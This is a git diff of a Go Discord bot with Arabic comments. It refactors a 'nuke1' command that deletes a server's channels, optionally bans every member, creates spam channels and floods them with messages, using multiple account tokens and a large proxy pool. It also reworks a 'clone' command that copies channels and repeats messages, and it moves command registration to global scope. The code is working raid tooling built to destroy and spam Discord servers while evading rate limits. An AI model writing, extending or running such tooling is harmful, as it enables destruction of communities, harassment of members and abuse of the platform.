@@ -61,16 +61,15 @@ func main() {
 
 	sess.Identify.Intents = discordgo.IntentsAll
 
-	// 1. تعريف أمر nuke1 (مع خيار الباند أو بدون)
-	cmdNukeName := "nuke1"
-	commandNuke := &discordgo.ApplicationCommand{
-		Name:        cmdNukeName,
+	// تعريف الأوامر
+	cmdNuke := &discordgo.ApplicationCommand{
+		Name:        "nuke1",
 		Description: "أمر التدمير: حذف، سبام، وخيار تفعيل الباند أو إلغائه",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionBoolean,
 				Name:        "enable_ban",
-				Description: "هل تريد تفعيل باند الأعضاء؟ (true للباند، false بدونه)",
+				Description: "هل تريد تفعيل باند الأعضاء؟",
 				Required:    true,
 			},
 			{
@@ -106,10 +105,8 @@ func main() {
 		},
 	}
 
-	// 2. تعريف أمر clone (للنسخ البحت)
-	cmdCloneName := "clone"
-	commandClone := &discordgo.ApplicationCommand{
-		Name:        cmdCloneName,
+	cmdClone := &discordgo.ApplicationCommand{
+		Name:        "clone",
 		Description: "أمر النسخ: استنساخ الرومات من سيرفر مصدر وتكرار الرسائل",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
@@ -139,6 +136,27 @@ func main() {
 		},
 	}
 
+	// تسجيل الأوامر تلقائياً عند اتصال البوت
+	sess.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
+		fmt.Printf("✅ البوت متصل الآن باسم: %s\n", s.State.User.Username)
+		
+		// تسجيل عام (Global) لضمان ظهورها بكل مكان
+		_, err := s.ApplicationCommandCreate(s.State.User.ID, "", cmdNuke)
+		if err != nil {
+			fmt.Println("❌ خطأ في تسجيل أمر nuke1:", err)
+		} else {
+			fmt.Println("✨ تم تسجيل أمر nuke1 بنجاح!")
+		}
+
+		_, err = s.ApplicationCommandCreate(s.State.User.ID, "", cmdClone)
+		if err != nil {
+			fmt.Println("❌ خطأ في تسجيل أمر clone:", err)
+		} else {
+			fmt.Println("✨ تم تسجيل أمر clone بنجاح!")
+		}
+	})
+
+	// معالج التفاعل والأوامر
 	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		if i.Type != discordgo.InteractionApplicationCommand {
 			return
@@ -156,7 +174,6 @@ func main() {
 		}
 
 		cmdName := i.ApplicationCommandData().Name
-
 		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
 		for _, opt := range i.ApplicationCommandData().Options {
 			optionMap[opt.Name] = opt
@@ -165,7 +182,7 @@ func main() {
 		guildID := i.GuildID
 		botID := s.State.User.ID
 
-		if cmdName == cmdNukeName {
+		if cmdName == "nuke1" {
 			enableBan := optionMap["enable_ban"].BoolValue()
 			roomName := optionMap["room_name"].StringValue()
 			roomsCount := int(optionMap["rooms_count"].IntValue())
@@ -196,7 +213,7 @@ func main() {
 
 			go executeNukeEngine(tokens, massiveProxyPool, guildID, botID, roomName, roomsCount, messageContent, messagesCount, enableBan, s)
 
-		} else if cmdName == cmdCloneName {
+		} else if cmdName == "clone" {
 			sourceGuildID := optionMap["source_guild_id"].StringValue()
 			messageContent := optionMap["message_content"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
@@ -228,12 +245,7 @@ func main() {
 		return
 	}
 
-	// تسجيل الأوامر مباشرة على سيرفرك التجريبي لتظهر فوراً (استبدل YOUR_GUILD_ID بأيدي سيرفرك)
-	targetGuildID := "YOUR_GUILD_ID" 
-	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, targetGuildID, commandNuke)
-	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, targetGuildID, commandClone)
-	
-	fmt.Println("⚡ الأمرين (/nuke1 و /clone) جاهزان ويعملان بكفاءة!")
+	fmt.Println("⚡ البوت يعمل الآن في الانتظار...")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -283,7 +295,6 @@ func filterActiveProxies(rawProxies []string) []*http.Client {
 	return activeClients
 }
 
-// محرك Nuke1 (حذف، إنشاء عشوائي، سبام، واختيار الباند)
 func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		return
@@ -370,7 +381,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 		return false
 	}
 
-	// 1. حذف الرومات القديمة
 	chQueue := make(chan string, len(oldChannelIDs))
 	for _, id := range oldChannelIDs {
 		chQueue <- id
@@ -389,7 +399,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 	wgDel.Wait()
 
-	// 2. الباند (إذا تم تفعيله عبر الخيار true)
 	if includeBan && len(allUserIDs) > 0 {
 		userQueue := make(chan string, len(allUserIDs))
 		for _, uid := range allUserIDs {
@@ -411,7 +420,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 		wgBan.Wait()
 	}
 
-	// 3. إنشاء الرومات الجديدة
 	roomChan := make(chan struct {
 		Payload []byte
 		Index   int
@@ -463,7 +471,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 	wgCreate.Wait()
 
-	// 4. إرسال الرسائل المتكررة
 	if len(newChannelIDs) > 0 && messagesCount > 0 {
 		var wgMsg sync.WaitGroup
 		for i, chID := range newChannelIDs {
@@ -482,7 +489,6 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 }
 
-// محرك Clone (نسخ الرومات من سيرفر مصدر وتكرار الرسائل بدقة)
 func executeCloneEngine(tokens []string, rawProxies []string, guildID, sourceGuildID string, messageContent string, messagesCount int, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		return
